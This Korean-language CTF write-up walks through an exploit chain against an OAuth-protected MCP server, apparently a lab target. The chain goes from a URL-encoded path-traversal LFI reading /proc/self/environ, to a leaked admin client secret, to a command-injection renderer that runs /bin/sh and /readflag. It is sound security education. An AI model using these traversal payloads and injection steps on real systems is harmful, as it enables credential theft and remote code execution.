---
title: "Hypersonic CTF"
date: 2026-06-08
categories: [CTF]
tags: [hypersonic, CTF]
published: false
---

# MCPP Write-up

## Challenge

문제 서버에 접속하면 `hypersonic-mcpp`라는 MCP 서버가 실행 중인 것을 확인할 수 있다.

```text
Target: http://13.209.205.230:28787
Server: hypersonic-mcpp
```

루트 페이지에 접근하면 다음과 같은 응답이 나온다.

```text
HTTP/1.1 200 OK
Server: hypersonic-mcpp
x-hypersonic-route: /

Hypersonic MCP is running. Use /mcp for MCP or /healthz.
```

처음에는 일반적인 웹 서버처럼 보였지만, 응답 내용을 보면 `/mcp`와 `/healthz`를 사용하라고 안내하고 있었다.
`/healthz`는 정상적인 health check 응답을 반환했고, `/mcp`에 인증 없이 접근하면 Bearer token을 요구했다.

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer resource_metadata="http://127.0.0.1:28787/.well-known/oauth-protected-resource"
```

즉, 이 문제는 OAuth로 보호된 MCP 서버의 인증 흐름과 MCP 기능을 분석하는 문제이다.

---

## Initial Analysis

OAuth metadata를 확인하면 다음과 같은 엔드포인트들이 존재한다.

```text
/register
/authorize
/token
```

지원하는 인증 방식은 Authorization Code + PKCE였고, 기본 사용자 권한은 다음 scope를 사용한다.

```text
hypersonic:user
```

전체적인 공격 흐름은 다음과 같다.

1. 일반 OAuth client를 등록한다.
2. Authorization Code + PKCE 방식으로 user access token을 얻는다.
3. MCP session을 초기화한다.
4. MCP resource와 tool 목록을 확인한다.
5. runbook resource에서 LFI 취약점을 이용한다.
6. `/proc/self/environ`에서 admin client secret을 획득한다.
7. admin client credentials flow로 admin token을 발급받는다.
8. admin 전용 tool인 `admin_write_artifact`를 호출한다.
9. artifact preview renderer에 명령어를 삽입한다.
10. `read_artifact`를 트리거하여 `/readflag`를 실행한다.

최종적으로 LFI와 command execution이 연결되면서 flag를 획득할 수 있다.

---

## User OAuth Flow

Dynamic client registration이 활성화되어 있었기 때문에 일반 사용자용 OAuth client를 직접 등록할 수 있었다.

등록 요청은 다음과 같은 형태이다.

```json
{
  "redirect_uris": ["http://127.0.0.1:12345/callback"],
  "client_name": "mcp-test-client",
  "grant_types": ["authorization_code", "refresh_token"],
  "response_types": ["code"],
  "token_endpoint_auth_method": "client_secret_post"
}
```

client 등록 후 `/authorize`로 요청을 보내면 별도의 승인 화면 없이 바로 authorization code가 발급된다.

```text
Location: http://127.0.0.1:12345/callback?code=<code>&state=<state>
```

이 code와 PKCE verifier를 `/token`에 제출하면 user access token을 받을 수 있다.

```json
{
  "access_token": "<user-token>",
  "expires_in": 3600,
  "scope": "hypersonic:user",
  "token_type": "Bearer"
}
```

이제 이 token을 이용해 MCP 서버에 접근할 수 있다.

---

## MCP Discovery

`/mcp`에 `initialize` 요청을 보내면 MCP session이 생성된다.

응답 헤더에는 다음과 같은 session id가 포함된다.

```text
mcp-session-id: <session-id>
```

이후 MCP 요청에는 이 session id를 함께 보내야 한다.
session id 없이 요청했을 때는 다음과 같은 오류가 발생했다.

```text
invalid_session
```
따라서 이후 요청에는 user access token과 `mcp-session-id`를 함께 포함해서 보냈다.

user scope에서 확인 가능한 tool 목록은 다음과 같다.

```json
[
  "search_artifacts",
  "read_artifact",
  "compare_artifacts"
]
```

resource 목록은 다음과 같다.

```json
[
  "hypersonic://manifest",
  "hypersonic://artifacts"
]
```

manifest를 읽어보면 서버 기능과 scope 정보를 확인할 수 있다.

```json
{
  "features": [
    "artifact-search",
    "artifact-json-write",
    "audit-ring",
    "prompt-templates",
    "scoped-tool-access"
  ],
  "auth": {
    "scopes": ["hypersonic:user", "hypersonic:admin"]
  }
}
```

여기서 `artifact-json-write`와 `hypersonic:admin`이 보인다.

user 권한에서는 write 관련 tool이 보이지 않았지만, manifest에는 `hypersonic:admin` scope와 `artifact-json-write` 기능이 표시되어 있었다.
따라서 admin 권한에서 사용할 수 있는 별도의 기능이 존재할 것으로 생각했다.

---

## Resource Template

resource template 목록을 확인하면 다음과 같은 runbook resource가 존재한다.

```json
{
  "resourceTemplates": [
    {
      "name": "runbook_resource",
      "uriTemplate": "hypersonic://runbook/{ref}",
      "description": "Fetch a runbook markdown file by name (URL-encoded names supported)."
    }
  ]
}
```

중요한 부분은 다음이다.

```text
hypersonic://runbook/{ref}
```

설명에 URL-encoded name을 지원한다고 되어 있으므로, URL encoding된 값이 내부 파일 경로 처리에 사용될 가능성이 있다고 보았다.

---

## Vulnerability 1: Runbook LFI

먼저 상대 경로 traversal을 시도하면 서버가 내부 경로를 에러 메시지로 노출한다.

```text
hypersonic://runbook/..%2Fflag
```

응답에는 다음과 같은 파일 경로가 노출되었다.

```text
failed to read file: /app/data/runbooks/../flag.md
```

이를 통해 runbook resource가 다음 디렉터리를 기준으로 파일을 읽는다는 것을 알 수 있었다.

```text
/app/data/runbooks/
```

핵심 취약점은 absolute path가 차단되지 않는다는 점이다.

예를 들어 `/etc/passwd`를 URL encoding하여 요청하면 다음과 같다.

```json
{
  "jsonrpc": "2.0",
  "id": 187,
  "method": "resources/read",
  "params": {
    "uri": "hypersonic://runbook/%2Fetc%2Fpasswd"
  }
}
```

요청 결과, 의도한 runbook 디렉터리 밖의 파일인 `/etc/passwd`를 그대로 반환한다.

```text
mcp:x:1000:1000::/home/mcp:/bin/sh
```

즉, runbook resource에는 Local File Inclusion 취약점이 존재한다.

---

## Environment Leak

LFI가 가능하므로 `/proc/self/environ`을 읽을 수 있다.

```json
{
  "jsonrpc": "2.0",
  "id": 22,
  "method": "resources/read",
  "params": {
    "uri": "hypersonic://runbook/%2Fproc%2Fself%2Fenviron"
  }
}
```

`/proc/self/environ`에는 현재 프로세스의 환경변수가 저장되어 있다.

응답에서 다음과 같은 값들을 확인할 수 있다.

```text
HYPERSONIC_ADMIN_CLIENT_SECRET=<admin-secret>
HYPERSONIC_USER_CLIENT_SECRET=<user-secret>
HYPERSONIC_DATA_DIR=/app/data
HOME=/home/mcp
PWD=/app
```

여기서 가장 중요한 값은 다음이다.

```text
HYPERSONIC_ADMIN_CLIENT_SECRET=<admin-secret>
```

admin client secret이 환경변수에 저장되어 있었고, LFI를 통해 이 값이 유출되었다.

이제 admin token을 발급받을 수 있다고 판단했다.

---

## Admin Token

노출된 환경변수와 추가로 확인한 문자열들을 바탕으로 admin client 관련 값을 확인할 수 있었다.

```text
hypersonic-admin
/oauth/token
client_credentials
admin_write_artifact
artifact_json
```

admin token은 client credentials 방식으로 발급받을 수 있다.

요청은 다음과 같은 형태이다.

```text
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&
client_id=hypersonic-admin&
client_secret=<admin-secret>&
scope=hypersonic%3Aadmin
```

요청이 성공하면 다음과 같이 admin scope가 포함된 access token이 반환된다.

```json
{
  "access_token": "<admin-token>",
  "expires_in": 3600,
  "scope": "hypersonic:user hypersonic:admin",
  "token_type": "Bearer"
}
```

scope에 `hypersonic:admin`이 포함된 것을 확인한 뒤, 이 token으로 새로운 MCP session을 초기화했다.

---

## Admin Tool Discovery

user 권한에서는 다음 tool만 확인할 수 있었다.

```text
search_artifacts
read_artifact
compare_artifacts
```

하지만 admin token으로 접근하면 admin 전용 tool을 사용할 수 있다.

```text
admin_write_artifact
```

이 tool은 artifact id와 serialized artifact JSON을 받아 artifact catalog에 새로운 artifact를 작성한다.

```json
{
  "jsonrpc": "2.0",
  "id": 31,
  "method": "tools/call",
  "params": {
    "name": "admin_write_artifact",
    "arguments": {
      "artifact_id": "HYP-FLAG-004",
      "artifact_json": "<serialized artifact JSON>"
    }
  }
}
```

여기서 중요한 점은 artifact 내용을 직접 제어할 수 있다는 것이다.

---

## Vulnerability 2: Artifact Renderer Command Injection

artifact에는 preview renderer 설정이 포함될 수 있다.

문제가 되는 부분은 다음과 같은 profile 구조이다.

```json
{
  "profile": {
    "name": "flagp4",
    "defaults": {
      "views": {
        "renderers": {
          "process": {
            "command": ["..."]
          }
        }
      }
    }
  }
}
```

`read_artifact`를 호출하면 artifact preview가 생성된다.

이때 preview renderer가 실행되면서, artifact 내부에 지정된 command가 실행된다.

즉, admin 권한으로 악성 artifact를 작성하고 `read_artifact`를 호출하면 command execution이 가능하다.

공격 흐름은 다음과 같다.

1. `admin_write_artifact`로 악성 artifact 작성
2. artifact profile에 process renderer command 삽입
3. `read_artifact` 호출
4. preview renderer 실행
5. command stdout이 응답에 포함됨

결국 artifact preview 기능이 명령어 실행 지점이 된다.

---

## Finding Flag Reader

command execution이 가능해졌으므로 flag를 읽는 방법을 찾았다.

서버 내부에는 `/readflag` 바이너리가 존재한다.

```text
/readflag
```

권한은 다음과 같다.

```text
---s--x--- 1 root mcp 14496 Jun 6 07:40 /readflag
```

`/readflag`는 root 소유이며, `mcp` 그룹에서 실행 가능한 setuid 바이너리이다.

따라서 renderer command를 통해 `/readflag`를 실행하면 flag를 얻을 수 있다.

---

## Exploit

최종 renderer command는 다음과 같이 구성했다.

```json
[
  "/bin/sh",
  "-c",
  "ls -l /readflag 2>&1; command -v timeout 2>&1; timeout 5 /readflag </dev/null 2>&1; echo RC=$?"
]
```

`timeout`을 사용한 이유는 `/readflag` 실행 과정에서 요청이 멈추는 상황을 방지하기 위해서이다.

이 command를 포함한 artifact를 `admin_write_artifact`로 작성한 뒤, `read_artifact`를 호출하면 renderer가 실행된다.

결과는 다음과 같다.

```text
---s--x--- 1 root mcp 14496 Jun 6 07:40 /readflag
/usr/bin/timeout
hs{4341f4768ce2bd952d7efe73cb8cfac8321feb4aab3bf1de41c178f9598fb328}RC=0
```

flag가 command output에 그대로 포함되어 반환된다.

---

## Flag

```text
hs{4341f4768ce2bd952d7efe73cb8cfac8321feb4aab3bf1de41c178f9598fb328}
```
